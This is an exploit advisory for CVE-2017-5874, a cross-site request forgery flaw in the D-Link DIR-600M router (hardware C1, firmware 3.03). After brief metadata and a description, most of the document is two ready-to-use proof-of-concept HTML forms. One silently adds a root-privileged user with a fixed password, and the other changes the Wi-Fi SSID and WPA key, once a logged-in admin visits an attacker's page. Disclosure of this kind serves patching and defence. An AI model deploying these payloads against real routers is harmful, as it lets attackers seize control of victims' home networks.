# Exploit Title:D-link wireless router DIR-600M – Cross-Site Request Forgery (CSRF) vulnerability
# Google Dork:N/A
# Date: 07/02/2017
# Exploit Author:Ajay S. Kulal (www.twitter.com/ajay_kulal)
# Vendor Homepage:dlink.com
# Software Link:N/A
# Version:Hardware version: C1  
          Firmware version: 3.03
# Tested on:All Platforms
# CVE :CVE-2017-5874

Abstract:
=======
 
Cross-Site Request Forgery (CSRF) vulnerability in the DIR-600M wireless router enables an attacker 
to perform an unwanted action on a wireless router for which the user/admin is currently authenticated.
 
 
Exploitation-Technique:
===================
Remote
 
Severity Rating:
===================
 
7.9 (AV:A/AC:M/Au:N/C:C/I:C/A:C)

Details:
=======
An attacker who lures a DIR-600M authenticated user to browse a malicious website 
can exploit cross site request forgery (CSRF) to add new admin, change wifi password and to change other network settings.
 
Proof Of Concept code:
====================
 
1. Add new user with root access

 <html>
   <!-- CSRF PoC - by Ajay Kulal -->
   <body>
     <form action="http://192.168.0.1/form2userconfig.cgi" method="POST">
       <input type="hidden" name="username" value="AK" />
       <input type="hidden" name="privilege" value="2" />
       <input type="hidden" name="newpass" value="dolphin" />
       <input type="hidden" name="confpass" value="dolphin" />
       <input type="hidden" name="adduser" value="Add" />
       <input type="hidden" name="hiddenpass" value="" />
       <input type="hidden" name="submit&#46;htm&#63;userconfig&#46;htm" value="Send" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
 </html>




2. changing wireless password

 <html>
   <!-- CSRF PoC - by Ajay Kulal -->
   <body>
     <form action="http://192.168.0.1/form2WlanBasicSetup.cgi" method="POST">
       <input type="hidden" name="domain" value="1" />
       <input type="hidden" name="hiddenSSID" value="on" />
       <input type="hidden" name="ssid" value="Dravidian" />
       <input type="hidden" name="band" value="10" />
       <input type="hidden" name="chan" value="0" />
       <input type="hidden" name="chanwid" value="1" />
       <input type="hidden" name="txRate" value="0" />
       <input type="hidden" name="method&#95;cur" value="0" />
       <input type="hidden" name="method" value="2" />
       <input type="hidden" name="authType" value="2" />
       <input type="hidden" name="length" value="1" />
       <input type="hidden" name="format" value="2" />
       <input type="hidden" name="defaultTxKeyId" value="1" />
       <input type="hidden" name="key1" value="0000000000" />
       <input type="hidden" name="pskFormat" value="0" />
       <input type="hidden" name="pskValue" value="password123" />
       <input type="hidden" name="checkWPS2" value="1" />
       <input type="hidden" name="save" value="Apply" />
       <input type="hidden" name="basicrates" value="15" />
       <input type="hidden" name="operrates" value="4095" />
       <input type="hidden" name="submit&#46;htm&#63;wlan&#95;basic&#46;htm" value="Send" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
 </html>